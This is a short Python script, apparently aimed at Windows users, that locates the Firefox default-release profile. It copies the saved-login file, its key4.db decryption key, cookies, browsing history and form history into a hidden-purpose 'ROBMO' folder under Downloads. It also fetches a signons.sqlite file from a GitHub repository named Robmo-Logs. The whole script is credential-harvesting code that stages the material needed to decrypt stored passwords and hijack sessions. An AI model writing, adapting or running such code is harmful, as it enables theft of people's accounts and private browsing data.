import os
import requests
import getpass
import shutil

user = os.path.expanduser("~")

def get_signons(user):
    git = "https://github.com/matiasb186/Robmo-Logs/raw/main/signons.sqlite"
    download = os.path.join("C:/Users", user, "Downloads")
    robmo = os.path.join(download, "ROBMO")
    if not os.path.exists(robmo):
        os.mkdir(robmo)
    file = os.path.join(robmo, "signons.sqlite")
    response = requests.get(git)
    if response.status_code == 200:
        with open(file, 'wb') as file:
            file.write(response.content)

def fire_profile(user):
    profiles = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    
    for root, dirs, files in os.walk(profiles):
        for profile in dirs:
            if 'default-release' in profile:
                return profile
    return None

def copy(user, profile, destination):
    source = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", profile)
    logins = os.path.join(source, "logins.json")
    key = os.path.join(source, "key4.db")
    cookies = os.path.join(source, "cookies.sqlite")
    places = os.path.join(source, "places.sqlite")
    formh = os.path.join(source, "formhistory.sqlite")
    
    shutil.copy(logins, os.path.join(destination, "logins.json"))
    shutil.copy(key, os.path.join(destination, "key4.db"))
    shutil.copy(cookies, os.path.join(destination, "cookies.sqlite"))
    shutil.copy(places, os.path.join(destination, "places.sqlite"))
    shutil.copy(formh, os.path.join(destination, "formhistory.sqlite"))

firefox_profile = fire_profile(user)

get_signons(user)

copy(user, firefox_profile, os.path.join("C:/Users", user, "Downloads", "ROBMO"))
